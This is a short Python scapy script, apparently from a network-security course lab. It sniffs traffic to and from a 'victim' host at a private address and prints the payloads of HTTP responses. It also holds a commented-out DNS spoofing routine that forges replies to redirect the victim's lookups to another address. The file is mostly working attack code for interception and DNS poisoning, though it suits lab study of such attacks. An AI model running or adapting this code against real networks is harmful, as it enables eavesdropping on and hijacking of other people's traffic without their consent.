from scapy.all import *
from scapy.layers.http import *
import os


def handle_victim(pkt):
    if  pkt.haslayer(IP):
        if pkt.haslayer(HTTPResponse):
            if pkt.haslayer(Raw):
                print(pkt[Raw])
            
# def callback(pkt):
#     if pkt.haslayer(DNSQR) and pkt.haslayer(UDP):
#         # pkt[DNS].dport = 10000
#         # send(pkt)
#         if str(pkt[DNS].qd.qname) == "b'ns.course.secrank.cn.'":
#             # print('Sent:', spoofed_pkt.summary())
#             print(pkt.summary())
#             redirect_to = '10.0.2.17'
#             spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
#                 UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
#                 DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
#                 an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
#             send(spoofed_pkt, iface="ens160")

sniff(filter="dst 10.0.3.16 or src 10.0.3.16", prn=handle_victim, iface='ens160')